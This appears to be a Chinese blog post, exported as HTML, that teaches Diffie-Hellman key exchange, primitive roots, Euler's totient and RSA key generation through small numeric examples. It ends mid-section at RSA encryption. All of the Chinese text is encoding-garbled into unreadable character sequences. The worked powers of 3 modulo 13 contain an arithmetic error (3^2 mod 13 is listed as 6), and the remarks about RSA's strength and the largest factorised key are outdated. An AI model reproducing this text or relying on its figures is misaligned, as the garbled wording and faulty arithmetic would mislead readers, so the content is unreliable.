<li><p>Aliceå’ŒBobé€šè¿‡äº¤æµ,å†³å®šé€‰æ‹©ç´ æ•°$p&#x3D;23$ä»¥åŠåŸæ ¹$g&#x3D;5$</p>
</li>
<li><p>Aliceé€‰æ‹©ä¸€ä¸ªç§˜å¯†æ•´æ•°$a&#x3D;4$,Bobé€‰æ‹©ä¸€ä¸ªç§˜å¯†æ•´æ•°$b&#x3D;3$</p>
</li>
<li><p>Aliceå’ŒBobåˆ†åˆ«ä½¿ç”¨$p,g,a$å’Œ$b$è®¡ç®—å‡º$A$å’Œ$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Aliceå’ŒBobåˆ†åˆ«å°†è¿™ä¸¤ä¸ªæ•°å­—$A&#x3D;4$å’Œ$B&#x3D;10$é€šè¿‡ç½‘ç»œå‘é€ç»™å¯¹æ–¹ã€‚</p>
</li>
<li><p>Aliceå’ŒBobæ”¶åˆ°$B$å’Œ$A$ä¹‹åï¼Œåˆ†åˆ«è®¡ç®—ï¼š</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>ç°åœ¨Aliceå’ŒBobæ‹¥æœ‰äº†ä¸€ä¸ªå…±åŒçš„å¯†é’¥18ã€‚è€Œä¸”è¿™ä¸ªå¯†é’¥ä»æ¥æ²¡æœ‰åœ¨ç½‘ç»œä¸Šä¼ è¾“è¿‡</p>
</li>
</ol>
<p>ä¸ºä»€ä¹ˆAliceå’ŒBobå¯ä»¥è·å¾—å…±åŒçš„å…¬é’¥å‘¢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>é‚£ç°åœ¨çœ‹ä¸€ä¸‹ï¼ŒDHç®—æ³•å¯ä»¥è¿è¡Œçš„å…³é”®æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å³ä½¿æ”»å‡»è€…Eveå¯ä»¥è·å¾—23ã€5ã€$A$å’Œ$B$ï¼Œå¥¹ä»ç„¶ä¸èƒ½å¾—åˆ°Aliceå’ŒBobçš„ç§˜å¯†æ•°å­—4å’Œ3ã€‚ä¹Ÿå³ï¼Œå³ä½¿çŸ¥é“ $5^3mod(23)&#x3D;10$è¿™ä¸ªè®¡ç®—è¿‡ç¨‹ä¸­çš„åº•æ•°5ï¼Œæ¨¡æ•°23å’Œç»“æœ10ï¼Œå¥¹ä¾ç„¶ä¸èƒ½å¾—åˆ°æŒ‡æ•°3ã€‚è¿™ä¸ªå°±æ˜¯DHç®—æ³•æ‰€ä¾èµ–çš„è®¡ç®—ç¦»æ•£å¯¹æ•°çš„éš¾åº¦ã€‚ï¼ˆè¯æ˜è®¡ç®—ç¦»æ•£å¯¹æ•°å¾ˆéš¾è¶…çº²ï¼‰</p>
<p>å½“ç„¶æˆ‘ä»¬è¿™é‡Œæ‰€ä¸¾çš„ä¾‹å­éå¸¸ç®€å•ï¼Œåœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œå¿…é¡»ä½¿ç”¨å¾ˆå¤§çš„  $p,a,b$ã€‚å¦‚æœ $p$é•¿åº¦ä¸º300ä½ï¼Œ$a$å’Œ$b$ é•¿åº¦ä¸º100ä½ï¼Œé‚£åŸºæœ¬å°±å®‰å…¨äº†ã€‚</p>
<h4 id="åŸæ ¹"><a href="#åŸæ ¹" class="headerlink" title="åŸæ ¹"></a>åŸæ ¹</h4><p>å¦‚æœaæ˜¯ç´ æ•°<em>p</em>çš„ä¸€ä¸ªåŸæ ¹ï¼Œé‚£ä¹ˆæ•°å€¼ï¼š</p>
<p><em>a</em>mod<em>p</em>ï¼Œ<em>a^2</em> mod<em>p</em>ï¼Œâ€¦ï¼Œ<em>a^(p-1)</em> mod<em>p</em></p>
<p>æ˜¯å„ä¸ç›¸åŒçš„æ•´æ•°ï¼Œä¸”ä»¥æŸç§æ’åˆ—æ–¹å¼ç»„æˆäº†ä»<em>1</em>åˆ°<em>p-1</em>çš„æ‰€æœ‰æ•´æ•°ã€‚</p>
<p>ä¾‹å­ï¼Œ3æ˜¯7çš„åŸæ ¹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233995.jpg" alt="img">æ¥è‡ªwiki</p>
<p>åä¾‹ï¼š3ä¸æ˜¯13çš„åŸæ ¹ã€‚<br>$$<br>3^1mod13&#x3D;3<br>\3^2mod13&#x3D;6<br>\3^3mod13&#x3D;1<br>\3^4mod13&#x3D;3<br>\3^5mod13&#x3D;9<br>\3^6mod13&#x3D;1<br>\3^7mod13&#x3D;3<br>$$</p>
<h4 id="æ¬§æ‹‰å‡½æ•°"><a href="#æ¬§æ‹‰å‡½æ•°" class="headerlink" title="æ¬§æ‹‰å‡½æ•°"></a>æ¬§æ‹‰å‡½æ•°</h4><p>æ¬§æ‹‰å‡½æ•°æè¿°çš„é—®é¢˜æ˜¯ï¼Œ<strong>ä»»æ„ç»™å®šæ­£æ•´æ•°nï¼Œåœ¨å°äºç­‰äºnçš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªä¸næ„æˆäº’è´¨å…³ç³»ï¼Ÿè¿™ä¸ªå‡½æ•°ä¸€èˆ¬è¡¨ç¤ºä¸º</strong>$\varphi(n)$ã€‚</p>
<p><strong>æ¬§æ‹‰å‡½æ•°çš„é€šå¼</strong>ï¼š$\varphi(n)&#x3D;n(1-1&#x2F;p1)(1-1&#x2F;p2)(1-1&#x2F;p3)(1-1&#x2F;p4)â€¦â€¦(1-1&#x2F;pn)$</p>
<p>å…¶ä¸­p1, p2â€¦â€¦pnä¸ºnçš„æ‰€æœ‰è´¨å› æ•°(10çš„è´¨å› æ•°æ˜¯2å’Œ5, 4çš„è´¨å› å­åªæœ‰2)ï¼Œnæ˜¯ä¸ä¸º0çš„æ•´æ•°ã€‚$\varphi(1)&#x3D;1$ï¼ˆå”¯ä¸€å’Œ1äº’è´¨çš„æ•°å°±æ˜¯1æœ¬èº«ï¼‰ã€‚</p>
<p>â€‹                                                   $\varphi(x)&#x3D;x\prod_{i&#x3D;1}^n(1-\frac{1}{p_i})$</p>
<p>$\varphi(10)&#x3D;4$,      å› ä¸º1,3,7,9å’Œ10äº’è´¨</p>
<p>è®¾mæ˜¯æ­£æ•´æ•°ï¼Œaæ˜¯æ•´æ•°ï¼Œè‹¥aæ¨¡mçš„é˜¶ç­‰äº$\varphi(m)$ï¼Œåˆ™ç§°aä¸ºæ¨¡mçš„ä¸€ä¸ªåŸæ ¹ã€‚å¯¹äº(a,m)&#x3D;1çš„æ•´æ•°ï¼Œæ»¡è¶³a^râ‰¡1 (mod m ) çš„æœ€å°æ•´æ•°r,ç§°ä¸ºaæ¨¡mçš„é˜¶ã€‚å³$a^{\varphi(m)}\equiv1(modm)$</p>
<p>ã€mæœ‰åŸæ ¹çš„å……è¦æ¡ä»¶æ˜¯$m&#x3D; 1,2,4,p,2p,p^n$ï¼Œå…¶ä¸­pæ˜¯å¥‡è´¨æ•°(é™¤2ä»¥å¤–çš„æ‰€æœ‰è´¨æ•°)ï¼Œnæ˜¯ä»»æ„æ­£æ•´æ•°ï¼›ä¹Ÿå³ä¸æ˜¯æ‰€æœ‰çš„æ•°éƒ½æœ‰åŸæ ¹ã€‘</p>
<p>å¦‚æœæ­£æ•´æ•°mæœ‰åŸæ ¹ï¼Œé‚£ä¹ˆåŸæ ¹çš„ä¸ªæ•°ä¸º $\varphi(\varphi(m))$</p>
<p>å¦å¤–è¡¥å……ä¸€ä¸‹æ¬§æ‹‰å®šç†ã€‚å¦‚æœæ•´æ•°$a$å’Œ$m$äº’è´¨,é‚£ä¹ˆ$a^{\varphi(m)}\equiv1(modm)$ .è´¹é©¬å°å®šç†æ˜¯æ¬§æ‹‰å®šç†å½“$m$ æ˜¯ç´ æ•°æ—¶çš„ç‰¹ä¾‹ã€‚ï¼ˆæ¬§æ‹‰å®šç†å¾ˆæœ‰ç”¨ï¼Œåœ¨åé¢RSAä¸­è¿˜ä¼šå‡ºç°ã€‚ï¼‰</p>
<p>ä¾‹1:n &#x3D; 23è€Œè¨€ï¼ŒåŸæ ¹çš„ä¸ªæ•°åº”è¯¥æ˜¯<br>$$<br>\varphi(23)&#x3D;23*(1-\frac{1}{23})&#x3D;22 \<br>\varphi(\varphi(23))&#x3D;\varphi(22)&#x3D;22*(1-\frac{1}{2})*(1-\frac{1}{11})&#x3D;10<br>$$</p>
<p>å¯ä»¥å¾ˆå®¹æ˜“ç®—å‡ºï¼Œä»1~p-1çš„22ä¸ªæ•°ä¸­ï¼Œ</p>
<p>5, 7, 10, 11, 14, 15, 17, 19, 20, 21å…±10ä¸ªæ•°å­—æ˜¯23çš„åŸæ ¹ã€‚</p>
<p>ä¾‹2:n &#x3D; 13è€Œè¨€ï¼ŒåŸæ ¹çš„ä¸ªæ•°åº”è¯¥æ˜¯<br>$$<br>\varphi(13)&#x3D;13*(1-\frac{1}{13})&#x3D;12 \<br>\varphi(\varphi(13))&#x3D;\varphi(12)&#x3D;12*(1-\frac{1}{2})*(1-\frac{1}{3})&#x3D;4<br>$$</p>
<p>å¯ä»¥å¾ˆå®¹æ˜“ç®—å‡ºï¼Œä»1~p-1çš„12ä¸ªæ•°ä¸­ï¼Œ</p>
<p>2 5 7 11æ˜¯13çš„åŸæ ¹</p>
<p>æ‰€ä»¥è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œä¸ºä»€ä¹ˆåœ¨DHç®—æ³•ä¸­ï¼Œè¦å¼ºè°ƒä½¿ç”¨çš„æ˜¯åŸæ ¹ï¼Ÿè€Œä¸æ˜¯å’Œ $p$çš„ä»»æ„æ•°å­—ï¼Ÿå› ä¸ºæ ¹æ®ç´ æ•°çš„ç‰¹æ€§ï¼Œä¸è®ºæ˜¯ä¸æ˜¯åŸæ ¹ï¼Œä¸‹é¢çš„ç­‰å¼æ€»æ˜¯æˆç«‹çš„ã€‚</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>è¿™é‡Œä¸»è¦æ¶‰åŠçš„é—®é¢˜æ˜¯ï¼Œç ´è§£çš„éš¾åº¦ã€‚</p>
<p>å¦‚æœä½¿ç”¨çš„gä¸æ˜¯pçš„åŸæ ¹,é‚£ä¹ˆgçš„æ‰€æœ‰æŒ‡æ•°åªèƒ½ç”Ÿæˆå°äºpçš„æ•´æ•°çš„ä¸€ä¸ªå­é›†.é‚£ä¹ˆå¯¹äºæ”»å‡»è€…è€Œè¨€,æ­¤æ—¶å³ä½¿æ˜¯æš´åŠ›ç ´è§£,éœ€è¦è®¡ç®—çš„ä¹Ÿåªæ˜¯å°äºpçš„æ•´æ•°çš„å­é›†,è€Œä¸æ˜¯å°äºpçš„æ•´æ•°å…¨éƒ¨.</p>
<p>è­¬å¦‚ï¼Œå¯¹äºç´ æ•°13è€Œè¨€ï¼Œ3ä¸æ˜¯å®ƒçš„åŸæ ¹ï¼Œ(3^1&#x3D;3, 3^2&#x3D;9, 3^3&#x3D;1)modï¼ˆ13ï¼‰ï¼Œæ‰€ä»¥ç”Ÿæˆçš„æ¨¡æ•°åªæœ‰3ä¸ªï¼ˆorderï¼‰ï¼Œç­‰æ•ˆçš„æŒ‡æ•°ä¹Ÿåªæœ‰3ä¸ªï¼Œé™ä½äº†æ”»å‡»è€…æš´åŠ›ç ´è§£çš„éš¾åº¦ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨DHç³»ç»Ÿä¸­ï¼Œå¦‚æœé€‰æ‹©g&#x3D;3ï¼ŒAliceé€‰æ‹©äº† a&#x3D;7é‚£ä¹ˆå¯¹äºæ”»å‡»è€…Eveè€Œè¨€ï¼Œæœ¬æ¥å¥¹éœ€è¦å°è¯•åˆ°7ï¼ˆéå†å°äº13çš„å…¨éƒ¨æ•°å­—ï¼‰æ‰èƒ½å¾—åˆ° $3^7mod(13)&#x3D;3$ï¼›ä½†æ˜¯å®é™…ä¸Šï¼ŒEveåªéœ€è¦çŸ¥é“ $3^1mod(13)&#x3D;3$å°±è¶³å¤Ÿäº†ã€‚å› ä¸ºæœ€ç»ˆçš„$s&#x3D;[g^{ab}&#x3D;g^{7*b}&#x3D;(g^1)^b]mod(13)$</p>
<p>æ‰€ä»¥å¤§å¤§é™ä½äº†DHç®—æ³•çš„ç ´è§£éš¾åº¦ã€‚</p>
<p>å¦å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼ŒDHç®—æ³•å¹¶æ²¡æœ‰å¯¹åŒæ–¹èº«ä»½è¿›è¡ŒéªŒè¯ã€‚å½“Aliceå’ŒBobå¸Œæœ›è¿›è¡Œé€šä¿¡æ—¶ï¼ŒEveå¯ä»¥å¾ˆå®¹æ˜“åœ°å‘Aliceå†’å……è‡ªå·±æ˜¯Bobï¼Œä»¥åŠå‘Bobå†’å……è‡ªå·±æ˜¯Aliceï¼Œç„¶ååˆ†åˆ«å’ŒAliceå’ŒBobå»ºç«‹å…¬å…±çš„å¯¹ç§°å¯†é’¥ã€‚ç„¶åï¼ŒAliceåˆ°Bobçš„é€šä¿¡éƒ½ä¼šé€šè¿‡Eveå…ˆä½¿ç”¨è‡ªå·±ä¸Aliceå»ºç«‹çš„å¯†é’¥å…ˆè§£å¯†ï¼Œè·å¾—æ˜æ–‡ä¿¡æ¯ä¹‹åï¼Œå†ç”¨Eveä¸Bobå»ºç«‹çš„å¯†é’¥åŠ å¯†ï¼Œä¼ ç»™Bobã€‚Bobåˆ°Aliceçš„é€šä¿¡äº¦ç„¶ã€‚è¿™æ ·ï¼ŒAliceå’ŒBobä¼šä»¥ä¸ºè‡ªå·±å’Œå¯¹æ–¹çš„é€šä¿¡æ˜¯åŠ å¯†çš„ï¼Œä»è€Œæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯å®ƒä»¬çš„é€šä¿¡ä¼šç»è¿‡EveåŠ è§£å¯†ä¸€éã€‚Eveåœ¨Aliceå’ŒBobä¹‹é—´ï¼Œæ‹¦æˆªä»–ä»¬çš„é€šä¿¡ï¼Œå¹¶ä¸”ç»´æŒé€šä¿¡ï¼Œå°±ç§°ä¸ºä¸­é—´äººæ”»å‡»ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233996.jpg" alt="img"></p>
<p>ä¸ºäº†é˜²å¾¡ä¸­é—´äººæ”»å‡»ï¼Œå°±éœ€è¦ä¸€ä¸ªèƒ½å¤ŸéªŒè¯é€šä¿¡åŒæ–¹èº«ä»½çš„æœºåˆ¶æ¥é˜²æ­¢è¿™ç§æ”»å‡»ã€‚</p>
<hr>
<p>è¡¥å……ï¼Œ $\varphi(n)$çš„è®¡ç®—.ä¸¾ä¾‹æ¥è¯´,$\varphi(10)$è®¡ç®—çš„æ˜¯ä¸è¶…è¿‡10çš„è‡ªç„¶æ•°ä¸­ä¸10äº’è´¨çš„æ•°çš„ä¸ªæ•°ã€‚å› ä¸º10&#x3D;2*5ï¼Œä¹Ÿå³ä¸è¶…è¿‡10çš„è‡ªç„¶æ•°ä¸­ï¼Œæ‰€æœ‰2çš„å€æ•°ï¼Œä»¥åŠæ‰€æœ‰5çš„å€æ•°éƒ½ä¸ä¸10äº’è´¨ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å‡å»2çš„å€æ•°çš„ä¸ªæ•°ã€5çš„å€æ•°çš„ä¸ªæ•°ï¼Œä»¥åŠæ ¹æ®å®¹æ–¥åŸç†ï¼Œå†åŠ ä¸ŠåŒæ—¶æ˜¯2å’Œ5çš„å€æ•°çš„æ•°å­—çš„ä¸ªæ•°ï¼Œå°±å¯ä»¥ç®—å‡ºæ¥ä¸è¶…è¿‡10çš„è‡ªç„¶æ•°ä¸­ä¸10äº’è´¨çš„æ•°å­—çš„ä¸ªæ•°ã€‚ä¹Ÿå³ï¼Œ</p>
<p>$10-(10\div2)-(10\div5)+(10\div(2\times5))&#x3D;4$</p>
<p>ä¸Šé¢çš„å¼å­å¯ä»¥æ”¹å†™æˆï¼š</p>
<p>$10\times(1-\frac{1}{2})\times(1-\frac{1}{5})&#x3D;4$</p>
<p>ä¸Šé¢çš„å¼å­å¯ä»¥è¿›ä¸€æ­¥ç†è§£ä¸ºï¼š</p>
<p>$\varphi(10)&#x3D;\varphi(2\times5)&#x3D;\varphi(2)\times\varphi(5)$</p>
<p>ä¸Šé¢çš„å…¬å¼æ˜¯ä¸æ˜¯å¯ä»¥æ‰©å±•ä¸ºï¼š</p>
<p>$\varphi(p\times q)&#x3D;\varphi(p)\times\varphi(q)$ï¼Ÿ</p>
<p>ä¸Šè¿°ç»“è®ºåœ¨p å’Œqæ²¡æœ‰å…±åŒå…¬å› å­çš„æƒ…å†µä¸‹æ˜¯å¯ä»¥æˆç«‹çš„ã€‚ä½†æ˜¯åœ¨på’Œqå…±åŒå…¬å› å­çš„æƒ…å†µä¸‹åˆ™æœ‰é—®é¢˜ã€‚è­¬å¦‚è€ƒè™‘ $\varphi(8)$çš„æƒ…å†µã€‚ä¸å¤§äº8çš„è‡ªç„¶æ•°ä¸­ä¸8äº’è´¨çš„æ•°å°±æ˜¯å»é™¤æ‰€æœ‰2çš„å€æ•°çš„æ•°ã€‚å› æ­¤ï¼Œ</p>
<p>$\varphi(8)&#x3D;8-8\div2&#x3D;8\times(1-\frac{1}{2})$</p>
<p>åœ¨ä¸Šé¢çš„è®¡ç®—ä¸­ï¼Œè™½ç„¶ $8&#x3D;2^3$ ï¼Œä½†æ˜¯$\varphi(8)$  çš„è®¡ç®—ä¸æ¬¡å¹‚æ— å…³ã€‚å› æ­¤ï¼Œå¦‚æœå°†8è¿›è¡Œåˆ†è§£ï¼Œè­¬å¦‚ï¼Œåˆ†è§£æˆ</p>
<p>$\varphi(8)&#x3D;\varphi(2\times4)&#x3D;\varphi(2)*\varphi(4)$</p>
<p>æ˜¯æœ‰é—®é¢˜çš„ã€‚ç›¸å½“äºå¤šä¹˜äº†1&#x2F;2ã€‚ä¹Ÿå³ï¼Œåœ¨è´¨å› å­æœ‰å¹‚ä¹˜çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½å°†è´¨å› å­åˆ†è§£åˆ°ä¸¤ä¸ªä¹˜æ•°ä¸­å»ã€‚è¿™æ ·çœ‹æ¥ï¼Œå¦‚æœè®¡ç®—$\varphi(100)$ï¼Œä¸èƒ½å°†100åˆ†è§£æˆ$10<em>10$ï¼Œè€Œåº”è¯¥åˆ†è§£ä¸º$4</em>25$ã€‚è¿™æ ·è®¡ç®—å¾—å‡º</p>
<p>$$\varphi(100)&#x3D;\varphi(4)<em>\varphi(25)&#x3D;2</em>20&#x3D;40$$</p>
<p>åŒæ—¶ï¼Œ$\varphi(p^n)&#x3D;p^n\times(1-\frac{1}{p}&#x3D;p^{n-1}*(p-1))$ä¹Ÿå¯ä»¥ä¾¿äºè®¡ç®—ã€‚</p>
<h3 id="RSAç®—æ³•"><a href="#RSAç®—æ³•" class="headerlink" title="RSAç®—æ³•"></a>RSAç®—æ³•</h3><p>å¯¹æå¤§æ•´æ•°åšå› æ•°åˆ†è§£çš„éš¾åº¦å†³å®šäº†RSAç®—æ³•çš„å¯é æ€§ã€‚æ¢è¨€ä¹‹ï¼Œå¯¹ä¸€æå¤§æ•´æ•°åšå› æ•°åˆ†è§£æ„ˆå›°éš¾ï¼ŒRSAç®—æ³•æ„ˆå¯é ã€‚<br>å‡å¦‚æœ‰äººæ‰¾åˆ°ä¸€ç§å¿«é€Ÿå› æ•°åˆ†è§£çš„ç®—æ³•ï¼Œé‚£ä¹ˆRSAçš„å¯é æ€§å°±ä¼šæåº¦ä¸‹é™ã€‚ä½†æ‰¾åˆ°è¿™æ ·çš„ç®—æ³•çš„å¯èƒ½æ€§æ˜¯éå¸¸å°çš„ã€‚ä»Šå¤©åªæœ‰çŸ­çš„RSAå¯†é’¥æ‰å¯èƒ½è¢«æš´åŠ›ç ´è§£ã€‚åˆ°2008å¹´ä¸ºæ­¢ï¼Œä¸–ç•Œä¸Šè¿˜æ²¡æœ‰ä»»ä½•å¯é çš„æ”»å‡»RSAç®—æ³•çš„æ–¹å¼ã€‚<br>åªè¦å¯†é’¥é•¿åº¦è¶³å¤Ÿé•¿ï¼Œç”¨RSAåŠ å¯†çš„ä¿¡æ¯å®é™…ä¸Šæ˜¯ä¸èƒ½è¢«è§£ç ´çš„ã€‚</p>
<h4 id="RSAè¿‡ç¨‹çš„å…·ä½“ä¾‹å­"><a href="#RSAè¿‡ç¨‹çš„å…·ä½“ä¾‹å­" class="headerlink" title="RSAè¿‡ç¨‹çš„å…·ä½“ä¾‹å­"></a>RSAè¿‡ç¨‹çš„å…·ä½“ä¾‹å­</h4><ol>
<li><p>æŒ‘é€‰ä¸¤ä¸ªè´¨æ•°ï¼Œå¦‚ $p&#x3D;61,q&#x3D;53$</p>
</li>
<li><p>è®¡ç®—$n&#x3D;p*q&#x3D;3233$</p>
</li>
<li><p>è®¡ç®—$\varphi(n)&#x3D;\varphi(p)<em>\varphi(q)&#x3D;(p-1)</em>(q-1)&#x3D;3120$ã€è¿™ä¸€æ­¥å¯ä»¥è®¡ç®—ï¼ˆp-1ï¼‰å’Œï¼ˆq-1ï¼‰çš„æœ€å°å…¬å€æ•°ï¼Œä»è€Œä½¿å¾—è®¡ç®—çš„dæ¯”è¾ƒå°ï¼›17å…³äº780çš„æ¨¡é€†æ˜¯413ï¼Œæ¯”2753è¦å°ã€‘</p>
</li>
<li><p><strong>éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°eï¼Œæ¡ä»¶æ˜¯1&lt; e &lt; Ï†(n)ï¼Œä¸”eä¸Ï†(n) äº’è´¨ã€‚</strong></p>
<p>åœ¨1åˆ°3120ä¹‹é—´ï¼Œéšæœºé€‰æ‹©e&#x3D;17ã€‚ï¼ˆå®é™…åº”ç”¨ä¸­ï¼Œå¸¸å¸¸é€‰æ‹©65537ã€‚ï¼‰</p>
</li>
<li><p>è®¡ç®—å¾—å‡ºdï¼Œ ä½¿å¾—dæ˜¯eå…³äº3120çš„æ¨¡é€†ï¼Œå¾—å‡ºd &#x3D; 2753ï¼ˆæ¨¡é€†å¯ä»¥ä½¿ç”¨Euclidæ‰©å±•ç®—æ³•ï¼Œè¯æ˜ç•¥ï¼‰</p>
</li>
<li><p><strong>å°†nå’Œeå°è£…æˆå…¬é’¥ï¼Œnå’Œdå°è£…æˆç§é’¥ã€‚</strong> </p>
<p>åœ¨è¯¥ä¾‹å­ä¸­ï¼Œn&#x3D;3233ï¼Œe&#x3D;17ï¼Œd&#x3D;2753ï¼Œæ‰€ä»¥å…¬é’¥å°±æ˜¯ (3233,17)ï¼Œç§é’¥å°±æ˜¯ï¼ˆ3233, 2753ï¼‰ã€‚</p>
</li>
</ol>
<h4 id="RSAç®—æ³•çš„å¯é æ€§"><a href="#RSAç®—æ³•çš„å¯é æ€§" class="headerlink" title="RSAç®—æ³•çš„å¯é æ€§"></a>RSAç®—æ³•çš„å¯é æ€§</h4><p>å›é¡¾å¯†é’¥ç”Ÿæˆè¿‡ç¨‹ä¸€å…±å‡ºç°äº†6ä¸ªæ•°å­—: $p&#x3D;61,q&#x3D;53,n&#x3D;3233,\varphi(n)&#x3D;3120,e&#x3D;17,d&#x3D;2753$</p>
<p>é™¤äº†å…¬é’¥çš„nå’Œe,å…¶ä½™4ä¸ªæ•°å­—éƒ½æ˜¯ä¸å…¬å¼€çš„,åœ¨å·²çŸ¥nå’Œeçš„æƒ…å†µä¸‹èƒ½ä¸èƒ½æ¨å‡ºd?</p>
<ol>
<li>$e*d mod\varphi(n) &#x3D; 1$ åªæœ‰çŸ¥é“$e$å’Œ$\varphi(n)$,æ‰èƒ½ç®—å‡º$d$,eå·²çŸ¥,æ¥ä¸‹æ¥åªéœ€æ±‚$\varphi(n)$</li>
<li>$\varphi(n)&#x3D;(p-1)(q-1)$,åªæœ‰çŸ¥é“på’Œqæ‰èƒ½ç®—å‡º$\varphi(n)$</li>
<li>$n&#x3D;p*q$ åªæœ‰å°†nå› æ•°åˆ†è§£æ‰èƒ½ç®—å‡ºpå’Œq</li>
</ol>
<p><strong>ç»“è®ºï¼šå¦‚æœnå¯ä»¥è¢«å› æ•°åˆ†è§£ï¼Œdå°±å¯ä»¥ç®—å‡ºï¼Œä¹Ÿå°±æ„å‘³ç€ç§é’¥è¢«ç ´è§£ã€‚</strong></p>
<p>å¯æ˜¯ï¼Œå¤§æ•´æ•°çš„å› æ•°åˆ†è§£ï¼Œæ˜¯ä¸€ä»¶éå¸¸å›°éš¾çš„äº‹æƒ…ã€‚ç›®å‰ï¼Œé™¤äº†æš´åŠ›ç ´è§£ï¼Œè¿˜æ²¡æœ‰å‘ç°åˆ«çš„æœ‰æ•ˆæ–¹æ³•ã€‚på’Œqæ•°å­—è¶Šå¤§,ç ´è§£éš¾åº¦è¶Šé«˜,å½“ç„¶å¯¹åº”çš„åŠ å¯†è§£å¯†æ—¶é—´ä¹Ÿè¶Šé•¿</p>
<p>ä¾‹å¦‚:</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€12301866845301177551304949<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€58384962720772853569595334<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€79219732245215172640050726<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€36575187452021997864693899<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€56474942774063845925192557<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€32630345373154826850791702<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€61221429134616704292143116<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€02221240479274737794080665<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€351419597459856902143413</p>
</blockquote>
<p>å®ƒç­‰äºè¿™æ ·ä¸¤ä¸ªè´¨æ•°çš„ä¹˜ç§¯ï¼š</p>
<blockquote>
<p>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€33478071698956898786044169<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€84821269081770479498371376<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€85689124313889828837938780<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€02287614711652531743087737<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€814467999489<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€Ã—<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€36746043666799590428244633<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€79962795263227915816434308<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€76426760322838157396665112<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€79233373417143396810270092<br>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€798736308917</p>
</blockquote>
<p>äº‹å®ä¸Šï¼Œè¿™å¤§æ¦‚æ˜¯äººç±»å·²ç»åˆ†è§£çš„æœ€å¤§æ•´æ•°ï¼ˆ232ä¸ªåè¿›åˆ¶ä½ï¼Œ768ä¸ªäºŒè¿›åˆ¶ä½ï¼‰ã€‚æ¯”å®ƒæ›´å¤§çš„å› æ•°åˆ†è§£ï¼Œè¿˜æ²¡æœ‰è¢«æŠ¥é“è¿‡ï¼Œå› æ­¤ç›®å‰è¢«ç ´è§£çš„æœ€é•¿RSAå¯†é’¥å°±æ˜¯768ä½ã€‚</p>
<h4 id="åŠ å¯†è§£å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è§£å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è§£å¯†è¿‡ç¨‹"></a>åŠ å¯†è§£å¯†è¿‡ç¨‹</h4><p><strong>ï¼ˆ1ï¼‰åŠ å¯†è¦ç”¨å…¬é’¥ (n,e)</strong></p>
